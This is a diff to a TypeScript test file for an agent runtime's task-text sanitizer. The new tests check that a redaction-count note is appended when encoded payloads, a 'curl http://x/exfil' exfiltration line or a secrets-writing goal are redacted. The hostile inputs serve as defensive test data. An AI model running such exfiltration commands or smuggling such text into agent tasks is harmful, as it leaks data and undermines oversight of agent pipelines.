@@ -1,6 +1,6 @@
 import assert from "node:assert/strict";
 import test from "node:test";
-import { buildTaskPacket, sanitizeTaskText } from "../../../../src/runtime/task-packet.ts";
+import { buildTaskPacket, sanitizeTaskText, sanitizeTaskTextWithRedactionCount } from "../../../../src/runtime/task-packet.ts";
 import type { TeamRunManifest } from "../../../../src/state/types.ts";
 import type { WorkflowStep } from "../../../../src/workflows/workflow-config.ts";
 
@@ -107,6 +107,61 @@ test("buildTaskPacket handles empty/injection-only task (SEC-007)", () => {
 		cwd: process.cwd(),
 	});
 	assert.ok(!packet.objective.includes("SYSTEM:"), "Malicious content stripped");
+});
+
+// ─── G7 (DR-02 round-5): visible security-redaction note ───────────────
+
+test("G7: sanitizeTaskText appends ONE trailing note when a redaction fires", () => {
+	const output = sanitizeTaskText("Task: do work, then base64:aGVsbG8gd29ybGQ=");
+	assert.ok(output.includes("[encoded-redacted]"), "marker unchanged");
+	assert.ok(output.includes("(1 security redaction(s) applied by task-text sanitizer"), "note names the redaction count");
+	assert.equal(output.split("security redaction(s) applied").length - 1, 1, "exactly one note line");
+});
+
+test("G7: count accumulates per-rule hits (2 redactions → count 2)", () => {
+	const output = sanitizeTaskText("base64:aGVsbG8gd29ybGQ= and curl http://x/exfil data");
+	assert.ok(output.includes("(2 security redaction(s) applied"), "both rule hits counted");
+});
+
+test("G7: clean input stays byte-identical (no note)", () => {
+	const input = "Just a normal task description.";
+	assert.equal(sanitizeTaskText(input), input);
+});
+
+test("G7: zero-width stripping and blank collapse are cosmetic — never counted, no note", () => {
+	assert.equal(sanitizeTaskText("Hello\u200BWorld"), "HelloWorld");
+	assert.ok(!sanitizeTaskText("a\u200Bb\n\n\n\nc").includes("security redaction"), "no note for cosmetic-only changes");
+});
+
+test("G7: sanitizeTaskTextWithRedactionCount exposes the count without the note", () => {
+	const { text, redactionCount } = sanitizeTaskTextWithRedactionCount("base64:aGVsbG8gd29ybGQ=");
+	assert.equal(redactionCount, 1);
+	assert.ok(!text.includes("security redaction"), "raw text has no note (caller composes it)");
+});
+
+test("G7: buildTaskPacket appends ONE combined note when BOTH task and goal are redacted", () => {
+	const redactedGoalManifest: TeamRunManifest = { ...manifest, goal: "write secrets to vault" };
+	const packet = buildTaskPacket({
+		manifest: redactedGoalManifest,
+		step: { id: "test", role: "executor", task: "do {goal} then base64:aGVsbG8gd29ybGQ=" },
+		taskId: "test",
+		cwd: process.cwd(),
+	});
+	assert.equal(packet.objective.split("security redaction(s) applied").length - 1, 1, "exactly one note on the objective");
+	assert.ok(packet.objective.endsWith(")"), "note is the trailing line");
+	assert.ok(packet.objective.includes("(2 security redaction(s) applied"), "count = task hits + goal hits");
+	assert.ok(packet.objective.includes("[suspicious-write-redacted]"), "goal marker substituted in place");
+	assert.ok(!packet.objective.includes("{goal}"), "placeholder consumed");
+});
+
+test("G7: buildTaskPacket adds no note when nothing was redacted", () => {
+	const packet = buildTaskPacket({
+		manifest,
+		step: { id: "test", role: "executor", task: "Plain task for {goal}" },
+		taskId: "test",
+		cwd: process.cwd(),
+	});
+	assert.ok(!packet.objective.includes("security redaction"), "clean objective carries no note");
 });
 
 // ─── VULN-3: sanitizeTaskText parity with sanitizeAgentSystemPrompt ────────
